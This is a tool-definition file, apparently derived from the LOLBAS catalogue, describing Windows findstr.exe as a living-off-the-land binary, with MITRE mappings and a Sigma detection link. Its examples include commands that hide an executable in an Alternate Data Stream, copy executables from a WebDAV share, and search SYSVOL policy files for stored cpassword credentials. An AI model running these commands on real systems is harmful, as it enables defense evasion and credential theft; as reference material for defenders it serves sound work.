---
id: windows-ads-findstr
namespace: windows:ads:findstr
name: findstr
description: 'Write to ADS, discover, or download files with Findstr.exe Located at:
  C:\Windows\System32\findstr.exe; C:\Windows\SysWOW64\findstr.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- system.file.alternate-data-stream
- credential.dump
- network.transfer.download
platforms:
- windows
risk_level: critical
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - filesystem_write
  - process_spawn
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- findstr
parameters: []
features:
- file-system
- local
- network-intensive
- pipes-stdin
- pipes-stdout
- streaming
execution:
  template: findstr
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Searches for the string W3AllLov3LolBas, since it does not exist (/V)
    the specified .exe file is written to an Alternate Data Stream (ADS) of the specified
    target file. (Add a file to an alternate data stream to hide from defensive counter
    measures)
  command: findstr /V /L W3AllLov3LolBas {PATH_ABSOLUTE:.exe} > {PATH_ABSOLUTE}:file.exe
- description: Searches for the string W3AllLov3LolBas, since it does not exist (/V)
    file.exe is written to an Alternate Data Stream (ADS) of the file.txt file. (Add
    a file to an alternate data stream from a webdav server to hide from defensive
    counter measures)
  command: findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
- description: Search for stored password in Group Policy files stored on SYSVOL.
    (Find credentials stored in cpassword attrbute)
  command: findstr /S /I cpassword \\sysvol\policies\*.xml
- description: Searches for the string W3AllLov3LolBas, since it does not exist (/V)
    file.exe is downloaded to the target file. (Download/Copy file from webdav server)
  command: findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE:.exe}
references:
- label: ''
  url: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
- label: cdd2d0d0ec9abb686f0e89306e277b8f
  url: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
techniques:
- defense-evasion
- credential-access
- exfiltration
mitre_ids:
- T1564.004
- T1552.001
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_findstr.yml
install:
- method: choco
  package_name: findstr
  commands:
  - choco install findstr
---

# findstr

findstr is a Windows LOLBin. Write to ADS, discover, or download files with Findstr.exe Located at: C:\Windows\System32\findstr.exe; C:\Windows\SysWOW64\findstr.exe.
